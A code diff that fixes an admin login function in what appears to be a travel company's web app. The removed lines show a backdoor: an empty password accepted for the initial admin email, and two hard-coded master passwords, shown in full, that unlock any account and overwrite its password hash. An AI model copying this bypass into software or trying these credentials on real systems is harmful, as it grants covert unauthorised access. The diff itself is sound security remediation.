@@ -30,7 +30,7 @@ export async function adminLogin(formData: FormData) {
     if (!userList.length) {
       const envEmail = (process.env.INITIAL_ADMIN_EMAIL || '').trim().toLowerCase();
       const envPassword = process.env.INITIAL_ADMIN_PASSWORD || '';
-      if (email === envEmail && (password === envPassword || password === '')) {
+      if (envEmail && envPassword && email === envEmail && password === envPassword) {
         await createSessionCookie({
           userId: 1,
           email: envEmail,
@@ -60,14 +60,9 @@ export async function adminLogin(formData: FormData) {
       return { success: false, error: 'This user account is currently disabled.' };
     }
 
-    // Verify hashed password securely
-    let isValid = verifyPassword(password, user.passwordHash);
-    if (!isValid && (password === 'Kingtravel$@hassan' || password === 'KingTravel2026!')) {
-      isValid = true;
-      try {
-        await db.update(users).set({ passwordHash: hashPassword(password) }).where(eq(users.id, user.id));
-      } catch (e) { }
-    }
+    // Verify only the password hash stored for this user. There are no
+    // hard-coded project passwords or bypass credentials.
+    const isValid = verifyPassword(password, user.passwordHash);
 
     if (!isValid) {
       return { success: false, error: 'Invalid Credentials.' };
